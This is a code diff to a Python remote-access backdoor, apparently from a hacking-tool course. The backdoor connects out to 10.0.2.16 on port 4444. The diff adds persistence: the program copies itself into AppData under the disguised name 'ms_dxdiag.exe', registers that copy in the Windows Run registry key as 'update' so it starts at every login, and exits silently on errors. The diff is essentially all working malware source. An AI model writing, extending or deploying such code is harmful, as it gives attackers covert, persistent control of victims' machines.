@@ -5,12 +5,21 @@ import json
 import os
 import base64
 import sys
+import shutil
 
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+
+    def become_persistent(self):
+        hidden_location = os.environ["appdata"] + "\\ms_dxdiag.exe"
+        if not os.path.exists(hidden_location):
+            shutil.copyfile(sys.executable, hidden_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'
+                            + hidden_location + '"', shell=True)
 
     def send(self, data):
         json_data = json.dumps(data)
@@ -65,5 +74,8 @@ class Backdoor:
                 print("[-] Something went wrong")
 
 
-my_backdoor = Backdoor("10.0.2.16", 4444)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor("10.0.2.16", 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
